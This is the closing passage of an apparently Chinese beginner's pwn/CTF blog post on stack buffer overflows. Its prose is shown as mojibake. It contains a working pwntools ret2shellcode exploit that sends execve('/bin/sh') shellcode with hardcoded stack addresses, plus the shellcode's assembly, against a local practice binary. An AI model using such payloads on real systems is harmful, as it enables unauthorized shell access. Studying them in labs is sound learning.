<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;hacker&#39;</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>

<span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>i386</span><span class=o>.</span><span class=n>linux</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>112</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
<span class=c1># %ecx, %ebx, %edi, %ebp, &amp;buffer</span>
<span class=n>stack_elem</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xffffd1c0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0xffffd13c</span><span class=p>]</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;IIIII&#39;</span><span class=p>,</span> <span class=o>*</span><span class=n>stack_elem</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>åœ¨è°ƒè¯•å™¨ä¸­è§‚å¯Ÿï¼Œç¡®è®¤<code>ret</code>è·³è½¬åˆ°äº†<code>&buffer</code>ï¼Œå°†è„šæœ¬æ”¹ä¸º <code>pwn.process</code> å³å¯ã€‚</p>
<p><img src=/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162.png width=600 height=258 srcset="/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162_hu5bebb33353747b29ee3be2f01684cdb4_85729_480x0_resize_box_3.png 480w, /blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162_hu5bebb33353747b29ee3be2f01684cdb4_85729_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220817170010162 class=gallery-image data-flex-grow=232 data-flex-basis=558px></p>
<p>è¿˜å¯ä»¥çœ‹ä¸‹ <code>shellcraft.i386.linux.sh</code> æä¾›çš„ä»£ç ç‰‡æ®µé•¿ä»€ä¹ˆæ ·ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>    /* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */
    /* push b&#39;/bin///sh\x00&#39; */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array [&#39;sh\x00&#39;] */
    /* push &#39;sh\x00\x00&#39; */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* &#39;sh\x00&#39; */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
</code></pre></td></tr></table>
</div>
</div><p>ä¹ä¸€çœ‹æœ‰ç‚¹å¥‡æ€ªï¼Œä½†æ³¨æ„è§‚å¯Ÿæ±‡ç¼–åçš„æœºå™¨ç å°±ä¼šå‘ç°è¿™æ®µæ±‡ç¼–ç¼–è¯‘åä¸åŒ…å« <code>\x00</code>ï¼Œåœ¨ <code>strcpy</code> ä¹‹ç±»çš„åœºæ™¯ä¸‹èƒ½é¿å…è¢«æˆªæ–­ï¼Œæ³›ç”¨æ€§æ›´å¥½ã€‚</p>
<h2 id=æ€»ç»“>æ€»ç»“</h2>
<p>å­˜åœ¨å‡ ä¸ªé—®é¢˜ã€‚</p>
<ol>
<li>å¾ˆå¤šä¿æŠ¤æœºåˆ¶ç»•è¿‡æ–¹æ³•æ²¡æœ‰å­¦ã€‚ASLRã€PIEã€NXã€CANARY ç­‰ã€‚</li>
<li>èŠ±äº†å¾ˆé•¿æ—¶é—´å»æ— è°“åœ°ç®—åç§»ï¼Œæ˜æ˜ç»™äº† <code>andl -16, %esp</code> å´ä¸è‚¯çœ‹ä¸€çœ¼å¯¹é½å‰å <code>%esp</code> æ€ä¹ˆå˜ã€‚</li>
<li>gdb ä¸ç†Ÿç»ƒï¼Œ<code>gdb-peda</code> çœŸçš„å¾ˆå¥½ç”¨ï¼Œç»äº†ã€‚</li>
<li>è¿˜æ²¡è¯•è¿‡æ„é€  ROP Gadget é“¾</li>
</ol>
<p>å„æ–¹é¢éƒ½æœ‰å¾ˆå¤§æé«˜ç©ºé—´å§ã€‚æƒ³æ‰¾ä¸ªç¾¤ä»€ä¹ˆçš„æœ‰é—®é¢˜ä¸ç”¨è‡ªå·±å¼ºé’»ç‰›è§’å°–ã€‚</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/blog/tags/pwn/>pwn</a>
<a href=/blog/tags/security/>security</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>ç›¸å…³æ–‡ç« </h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>å‡ ä¸ªç®€å•çš„ pwn ç»ƒä¹ </h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<footer class=site-footer>
<section class=copyright>
&copy;
2021 -
2023 weakptr's ç¬”è®°
</section>
<section class=powerby>
GitHub Pages <br>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
ä¸»é¢˜ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> ç”± <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> è®¾è®¡
ï¼Œç”± <a href=https://nnnewb.github.io/blog/>nnnewb</a> ä¿®æ”¹
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">ç›®å½•</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#å‰è¨€>å‰è¨€</a></li>
<li><a href=#å‡†å¤‡>å‡†å¤‡</a></li>
<li><a href=#ç¼“å†²åŒºæº¢å‡º>ç¼“å†²åŒºæº¢å‡º</a>
<ol>
<li><a href=#åŸç†>åŸç†</a></li>
<li><a href=#32ä½æ ˆä¸Šç¼“å†²åŒºæº¢å‡º>32ä½æ ˆä¸Šç¼“å†²åŒºæº¢å‡º</a></li>
<li><a href=#64ä½æ ˆä¸Šç¼“å†²åŒºæº¢å‡º>64ä½æ ˆä¸Šç¼“å†²åŒºæº¢å‡º</a>
<ol>
<li><a href=#stack-canary>stack canary</a></li>
<li><a href=#æ ˆå¯¹é½>æ ˆå¯¹é½</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#rop-åŸºç¡€>ROP åŸºç¡€</a>
<ol>
<li><a href=#åŸç†-1>åŸç†</a></li>
<li><a href=#aslr>ASLR</a></li>
<li><a href=#ret2libc>ret2libc</a></li>
<li><a href=#ret2shellcode>ret2shellcode</a></li>
</ol>
</li>
<li><a href=#æ€»ç»“>æ€»ç»“</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/blog/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>